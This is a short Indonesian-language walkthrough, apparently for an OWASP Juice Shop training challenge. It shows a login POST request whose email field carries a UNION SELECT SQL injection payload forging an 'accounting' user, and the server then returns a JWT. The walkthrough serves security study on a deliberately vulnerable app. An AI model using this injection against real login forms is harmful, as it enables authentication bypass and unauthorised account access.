1. Bentuk POST request login seperti berikut <br />
<img width="1654" height="974" alt="Screenshot 2025-09-11 000825" src="https://github.com/user-attachments/assets/695d20ea-d3d9-4cb8-ba79-dc1b13b31462" />

2. Inject temporary user ke login request payload

```
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```
<img width="1839" height="1022" alt="Screenshot 2025-09-11 000925" src="https://github.com/user-attachments/assets/e0c0a7bb-0c13-41b0-8f92-7d2aa003f555" />


3. Server merespon dengan JWT token yang berarti login berhasil <br />
<img width="1848" height="1079" alt="image" src="https://github.com/user-attachments/assets/2a9b9ca5-0a4b-4007-bd49-9113a7d5c9cf" />
